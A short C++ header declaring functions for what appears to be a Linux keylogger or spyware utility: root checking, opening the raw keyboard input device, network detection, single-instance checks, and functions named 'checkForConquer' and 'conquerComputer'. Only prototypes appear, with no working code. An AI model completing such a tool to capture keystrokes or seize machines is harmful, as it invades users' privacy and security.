#ifndef __UTIL__P
#define __UTIL__P
#include <unistd.h>
#include <linux/input.h>
#include <sys/types.h>
#include <fcntl.h>
#include <stdlib.h>
#include <stdio.h>
#include <sys/socket.h>
#include <netdb.h>
#include <cstring>
#include <stdexcept>
#include <timerunit.h>
#include <dirent.h>

const int KEY_RELEASE = 0;
const int KEY_PRESS = 1;

void printHelpText(void);
void printVersionInfo(void);
void checkRoot(void);
void getKeyboardFile(char *);
int openKeyboardFile(void);
const bool isNetPresent(void);
const bool processAlreadyRunning(void);
const bool checkForConquer(void);
void conquerComputer(const char *);

#endif
